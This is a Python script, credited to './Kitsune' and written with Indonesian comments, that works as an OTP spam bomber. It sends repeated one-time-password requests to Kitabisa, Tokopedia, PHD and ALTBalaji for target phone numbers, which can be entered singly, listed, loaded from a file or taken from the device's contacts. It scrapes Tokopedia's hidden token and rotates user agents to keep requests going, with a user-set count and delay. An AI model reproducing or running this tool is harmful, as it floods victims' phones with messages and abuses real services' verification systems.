import requests,random,json,time,sys,os,re
# -----------------------------------------------------------
# Tidak ada author Untuk Sc ini kecuali ./Kitsune
# Recode!, dosa Tanggung Sendiri
# Thanks For MyFriends, FourX, MhankBarBar, Maulana, Rexy
# Underground Science And Termux Tutorial Group
# ---------------------------------------------------------------

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientasi Object
#------------------------Classes------------------------
class spam:
		
	def __init__(self, nomer):
		self.nomer = nomer
		
	def spam(self):
		hasil=requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
		if hasil.status_code == 200:
			return f'\x1b[92mSpamm kitabisa {self.nomer} \033[1;32mSucces!'
		elif hasil.status_code == 500:
			return f'\x1b[91mSpamm kitabisa {self.nomer} \x1b[91mFail!'
			
	def tokped(self):
		rands=random.choice(open('ua.txt').readlines()).split('\n')[0]
		kirim = {
			'User-Agent' : rands,
			'Accept-Encoding' : 'gzip, deflate',
			'Connection' : 'keep-alive',
			'Origin' : 'https://accounts.tokopedia.com',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With' : 'XMLHttpRequest',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
		}
		regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+self.nomer+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = kirim).text
		Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
		formulir = {
			"otp_type" : "116",
			"msisdn" : self.nomer,
			"tk" : Token,
			"email" : '',
			"original_param" : "",
			"user_id" : "",
			"signature" : "",
			"number_otp_digit" : "6"
		}
		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
		else:
			return f'\x1b[92mSpamm Tokped {self.nomer} \x1b[92mSucces!'

	def phd(self):
		param = {'phone_number':self.nomer}
		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
			return f'\x1b[92mSpamm PHD {self.nomer} \x1b[92mSucces!'
		else:
			return f'\x1b[92mSpamm PHD {self.nomer} \x1b[92mGagal!'
			
	def balaji(self):
		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		kod="62"
		ata={
				"country_code":kod,
				"phone_number":self.nomer
			}
		head={
			"Connection":"keep-alive",
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6"
			}
		req=requests.post(urlb,data=json.dumps(ata),headers=head)
		if '{"status":"ok"}' in req.text:
			return f'\x1b[92mSpamm BALAJI {self.nomer} \x1b[92mSucces!'
		else:
			return f'\x1b[92mSpamm BALAJI {self.nomer} \x1b[92mGagal!'
		


# -------------------------------------------------------------

# ---------------------------Fungsi----------------------------
def apakah():
	while True:
		lan=str(input(k+'\tWant more? y/n : '+h))
		if( lan == 'y' or lan == 'Y'):
			jnspam()
		elif(lan == 'n' or lan == 'N'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tFile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tTotal spam : '+h))
		dly=int(input(k+'\tDelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(io)
				if jns == 'ktbs':
					print('\t'+z.spam())
				elif jns == 'tkpd':
					print('\t'+z.tokped())
				elif jns == 'blji':
					print('\t'+z.balaji())
				elif jns == 'smua':
					print('\t'+z.spam())
					print('\t'+z.tokped())
					print('\t'+z.balaji())
					print('\t'+z.phd())
				elif jns == 'pehd':
					print('\t'+z.phd())
				else:
					print()
				time.sleep(dly)
		apakah()
	else:
		print(m+f'\tFile {fil} doesn`t exist')
def single():
	nomer=str(input(k+'\tPhone number : '+h))
	jm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'\tDelay : '+h))
	for oo in range(jm):
		z=spam(nomer)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
		elif jns == 'pehd':
			print('\t'+z.phd())
		else:
			print()
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tTotal number : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tNumber -{i+1} : '+h)))
	spm=int(input(k+'\tTotal spam : '+h))
	dly=int(input(k+'Delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(nomer[ss])
			if jns == 'ktbs':
				print('\t'+z.spam())
			elif jns == 'tkpd':
				print('\t'+z.tokped())
			elif jns == 'blji':
				print('\t'+z.balaji())
			elif jns == 'smua':
				print('\t'+z.spam())
				print('\t'+z.tokped())
				print('\t'+z.balaji())
				print('\t'+z.phd())
			elif jns == 'pehd':
				print('\t'+z.phd())
			else:
				print()
		time.sleep(dly)
	apakah()
#-------------------------Fungsi Banner-----------------------
def logo():
	os.system('clear')
	auth=m+'Author : '+k+'./kitsune'
	f='''
  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ 
▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒ 
░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░  
  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██  
▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒  
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░  
░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      
░  ░  ░  ░░         ░   ▒   ░     
      ░                 ░  ░       
'''
	return u+f+'\n'+auth
# -----------------------------------------------------------
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tchoose > '+h))-1]['number']
	dly=int(input(u+'\tDelay > '+h))
	for w in range(int(input(u+'\tTotal spam : '+h))):
		z=spam(nj)
		if jns == 'ktbs':
			print('\t'+z.spam())
		elif jns == 'tkpd':
			print('\t'+z.tokped())
		elif jns == 'blji':
			print('\t'+z.balaji())
		elif jns == 'smua':
			print('\t'+z.spam())
			print('\t'+z.tokped())
			print('\t'+z.balaji())
			print('\t'+z.phd())
		elif jns == 'pehd':
			print('\t'+z.phd())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(k+'Mode\n'+m+'-'*30+b+'\n\t1. Single Number\n\t2. Multi Number\n\t3. File List Number\n\t4. My Contact (Required termux-api)\n\t5. Back\n'+m+'-'*30)
	pil=str(input(k+'\tMode > '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	elif( pil == '5' or pil == '05'):
		jnspam()
	else:
		print(m+'             Don`t leave it blank')
		time.sleep(2)
		main()
def jnspam():
	global jns
	print(logo())
	print(k+'spam\n'+m+'-'*30+h+'\n\t1. Kita Bisa\n\t2. Tokopedia\n\t3. PHD\n\t4. Balaji (Without +62 or 0)\n\t5. All\n\t6. Exit\n'+m+'-'*30)
	while True:
		oy=str(input(k+'Spam > '+h))
		if( oy == '1' or oy == '01' ):
			jns='ktbs'
			break
		elif( oy == '2' or oy == '02' ):
			jns='tkpd'
			break
		elif( oy == '3' or oy == '03' ):
			jns='pehd'
			break
		elif( oy == '4' or oy == '04' ):
			jns='blji'
			break
		elif( oy == '5' or oy == '05' ):
			jns='smua'
			break
		elif( oy == '6' or oy == '06' ):
			sys.exit()
			break
		else:
			print(m+'             Don`t leave it blank')
			continue
	main()
jnspam()
